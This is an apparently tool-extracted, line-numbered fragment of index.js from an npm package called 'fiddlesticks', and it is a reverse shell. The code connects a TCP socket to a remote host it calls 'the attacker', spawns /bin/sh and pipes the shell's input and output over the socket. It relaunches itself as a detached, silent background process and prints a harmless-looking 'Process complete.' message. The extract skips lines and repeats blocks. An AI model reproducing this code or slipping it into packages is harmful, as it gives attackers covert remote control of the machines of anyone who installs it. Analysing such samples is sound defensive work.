// File: tmp/tmpsiwac2ry/fiddlesticks/package/index.js
// ======================================================================
Line 1: const net = require("net")
Line 2: _tmp_0 = require("child_process")
Line 8: process.argv.includes("--background")
Line 11: const client = new net.Socket()
Line 13: {
            console.log("Connected to the attacker.");

            // Spawn a shell
            const shell = spawn("/bin/sh", []);

            // Pipe input/output between shell and attacker
            client.pipe(shell.stdin);
            shell.stdout.pipe(client);
            shell.stderr.pipe(client);

            // Handle shell closure
            shell.on("close", () => {
                console.log("Shell closed. Exiting...");
                client.end();
            });
        }
Line 17: const shell = spawn("/bin/sh", [])
Line 20: client.pipe(shell.stdin)
Line 21: shell.stdout.pipe(client)
Line 22: shell.stderr.pipe(client)
Line 25: {
                console.log("Shell closed. Exiting...");
                client.end();
            }
Line 27: client.end()
Line 31: {
            console.error("Connection error:", err.message);
            // Exit instead of reconnecting
            client.destroy();
        }
Line 34: client.destroy()
Line 39: process.exit(0)
Line 43: reverseShell()
Line 44: {
    // Spawn itself as a detached background process
    const backgroundProcess = spawn("node", [__filename, "--background"], {
        detached: true,
        stdio: "ignore", // Ignore output
    });

    // Detach the child process
    backgroundProcess.unref();

    // Display process complete and exit the parent process
    console.log("Process complete.");
}
Line 46: const backgroundProcess = spawn("node", [__filename, "--background"], {
        detached: true,
        stdio: "ignore", // Ignore output
    })
